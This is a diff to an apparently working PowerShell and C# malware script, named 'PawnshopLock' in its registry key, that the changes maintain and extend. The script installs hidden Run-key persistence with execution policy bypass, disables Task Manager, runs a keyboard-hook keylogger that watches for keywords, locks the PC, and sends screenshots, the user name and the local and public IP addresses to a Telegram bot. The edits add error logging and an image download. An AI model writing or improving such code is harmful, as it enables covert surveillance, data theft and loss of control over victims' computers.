@@ -31,7 +31,7 @@ function Setup-Persistence {
         $value = "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$localFile`""
         Set-ItemProperty -Path $regPath -Name "PawnshopLock" -Value $value
     } catch {
-        # Consider logging error here
+        Write-Error "Setup-Persistence error: $_"
     }
 }
 
@@ -42,7 +42,7 @@ function Send-Telegram {
         $body = @{ chat_id = $chatID; text = $msg } | ConvertTo-Json -Compress
         Invoke-RestMethod "https://api.telegram.org/bot$botToken/sendMessage" -Method POST -Body $body -ContentType 'application/json'
     } catch {
-        # Consider logging error here
+        Write-Error "Send-Telegram error: $_"
     }
 }
 
@@ -57,7 +57,7 @@ function Send-TelegramPhoto {
         }
         Invoke-RestMethod -Uri "https://api.telegram.org/bot$botToken/sendPhoto" -Method Post -Form $form
     } catch {
-        # Consider logging error here
+        Write-Error "Send-TelegramPhoto error: $_"
     }
 }
 
@@ -70,7 +70,7 @@ function Disable-TaskManager {
         }
         Set-ItemProperty -Path $regPath -Name "DisableTaskMgr" -Value 1 -Type DWord -Force
     } catch {
-        # Consider logging error here
+        Write-Error "Disable-TaskManager error: $_"
     }
 }
 
@@ -82,7 +82,7 @@ function Enable-TaskManager {
             Set-ItemProperty -Path $regPath -Name "DisableTaskMgr" -Value 0 -Type DWord -Force
         }
     } catch {
-        # Consider logging error here
+        Write-Error "Enable-TaskManager error: $_"
     }
 }
 
@@ -119,7 +119,6 @@ public class KeyLogger {
     [DllImport("user32.dll")] private static extern bool UnhookWindowsHookEx(IntPtr hhk);
     [DllImport("user32.dll")] private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);
     [DllImport("kernel32.dll")] private static extern IntPtr GetModuleHandle(string lpModuleName);
-    [DllImport("user32.dll")] private static extern short GetAsyncKeyState(int vKey);
 
     public static event Action<string> OnKeywordDetected;
 
@@ -141,18 +140,17 @@ public class KeyLogger {
     private static IntPtr Hook(int nCode, IntPtr wParam, IntPtr lParam) {
         if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN) {
             int vkCode = Marshal.ReadInt32(lParam);
-            char c = Convert.ToChar(vkCode);
+            // Simple conversion, may not cover all keys correctly
+            char c = (char)vkCode;
             buffer.Append(c);
 
             string text = buffer.ToString().ToLower();
 
-            // Check for keywords "porn" or "codru"
             if (text.Contains("porn") || text.Contains("codru")) {
                 OnKeywordDetected?.Invoke(text);
                 buffer.Clear();
             }
 
-            // Limit buffer size to avoid memory issues
             if (buffer.Length > 100) buffer.Remove(0, buffer.Length - 50);
         }
         return CallNextHookEx(hookId, nCode, wParam, lParam);
@@ -243,7 +241,7 @@ function Lock-PC {
     try {
         $ipPublic = Invoke-RestMethod "https://api.ipify.org"
     } catch { $ipPublic = "n/a" }
-    $msg = "🔒 PC Locked: $pcID`nUser: $user`nLocal IP: $ipLocal`nPublic IP: $ipPublic`nUnlock with: $unlockCmd"
+    $msg = "🔒 PC Locked: $pcID`nUser: $env:USERNAME`nLocal IP: $ipLocal`nPublic IP: $ipPublic`nUnlock with: $unlockCmd"
     Send-Telegram $msg
 
     [KeyBlocker]::Block()
@@ -305,7 +303,9 @@ function Lock-PC {
                     Remove-Item $shot -Force -ErrorAction SilentlyContinue
                 }
             }
-        } catch {}
+        } catch {
+            Write-Error "Lock-PC timer error: $_"
+        }
     })
     $timer.Start()
 
@@ -314,6 +314,15 @@ function Lock-PC {
 
 # --- MAIN LISTENER LOOP ---
 Setup-Persistence
+
+# Download image for lock screen if not exists
+if (-not (Test-Path $tempImg)) {
+    try {
+        Invoke-WebRequest -Uri $imageURL -OutFile $tempImg
+    } catch {
+        Write-Error "Failed to download lock screen image: $_"
+    }
+}
 
 # Start keylogger
 [KeyLogger]::Start()
@@ -345,6 +354,8 @@ while ($true) {
                 }
             }
         }
-    } catch {}
+    } catch {
+        Write-Error "Main loop error: $_"
+    }
     Start-Sleep -Seconds 5
 }
